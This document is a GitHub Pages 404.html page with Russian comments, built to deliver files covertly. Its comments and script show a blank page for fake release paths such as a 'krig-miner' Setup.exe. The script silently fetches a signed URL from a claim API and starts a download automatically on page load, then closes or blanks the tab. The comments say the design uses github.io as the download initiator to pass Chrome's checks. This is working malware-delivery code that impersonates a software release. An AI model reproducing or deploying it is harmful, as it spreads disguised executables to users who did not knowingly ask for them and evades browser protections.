<!DOCTYPE html>
<!--
  404.html — GitHub Pages redirector для Chrome-clean раздачи (file-drpr).
  ВАРИАНТ: «пустой белый лист» — ноль видимого контента. Юзер кликает ссылку,
  видит пустую загружающуюся страницу, скачивание стартует само.

  КАК РАБОТАЕТ: GitHub Pages отдаёт этот файл на ЛЮБОЙ несуществующий путь,
  например https://<account>.github.io/kryptex/krig-miner/releases/tag/v1.2.1/Setup.exe
  Скрипт берёт location.pathname, дёргает claim-API, получает свежий signed URL
  приватного билда и навигируется. Content-Disposition: attachment → браузер
  стартует скачивание, вкладка остаётся пустой страницей на github.io.

  ДЕПЛОЙ: заменить https://api.wingo.digital (ниже в JS) на домен claim-API,
  например https://api.example.tld — и закоммитить в репу
  <account>.github.io вместе с index.html и .nojekyll.
-->
<html lang="en">
<head>
<meta charset="utf-8">
<title></title>
<meta name="referrer" content="no-referrer">
<meta http-equiv="Cache-Control" content="no-store">
<style>html,body{margin:0;padding:0;background:#fff}</style>
</head>
<body>
<script>
(function () {
  "use strict";
  /* https://api.wingo.digital → заменить при деплое на https://<api-домен> */
  var CLAIM_BASE = "https://api.wingo.digital";
  if (!CLAIM_BASE || CLAIM_BASE.indexOf("http") !== 0) return;

  /* Путь целиком уходит на сервер: резолвинг профиля (точный custom_url_path,
     конвенция /p/<имя>, первый сегмент = имя профиля) делает /claim. */
  var url = CLAIM_BASE + "/claim?path=" + encodeURIComponent(location.pathname);

  /* Тихий ретрай: до 3 попыток с интервалом 3с (покрывает сетевые блипы и
     кратковременный 503 pool-empty). Никакого видимого вывода — страница
     остаётся пустым листом. */
  /* Анти-даблклейм: F5/reload в течение 30с после успешного клейма не
     съедает билд повторно. Через 30с — можно (легитимный ре-даунлоад). */
  var guard = "dl_" + location.pathname;
  try {
    var t0 = sessionStorage.getItem(guard);
    if (t0 && Date.now() - Number(t0) < 30000) return;
  } catch (e) { /* sessionStorage недоступен — просто идём дальше */ }

  var tries = 0;
  function go() {
    fetch(url, { method: "GET", cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("HTTP " + r.status);
        return r.json();
      })
      .then(function (j) {
        if (!j || !j.url) throw new Error("no url in response");
        try { sessionStorage.setItem(guard, String(Date.now())); } catch (e) {}
        /* Content-Disposition: attachment → скачивание стартует, вкладка
           остаётся здесь. Инициатор (github.io) Chrome уже зафиксировал
           в момент старта скачивания — дальнейшее не влияет на вердикт. */
        window.location.href = j.url;
        /* Через 4с прячем URL: close() работает только для вкладок,
           открытых через JS; фолбэк — about:blank через replace(),
           чтобы Back не возвращал сюда и не ре-триггерил claim.
           (4с — безопасный тайминг: заголовки/запись в загрузки уже
           созданы; 1.2с в старой схеме ломал большие ZIP — не повторяем.) */
        setTimeout(function () {
          try { window.close(); } catch (e) {}
          try { window.location.replace("about:blank"); } catch (e) {}
        }, 4000);
      })
      .catch(function () {
        if (++tries < 3) setTimeout(go, 3000);
      });
  }
  go();
})();
</script>
</body>
</html>
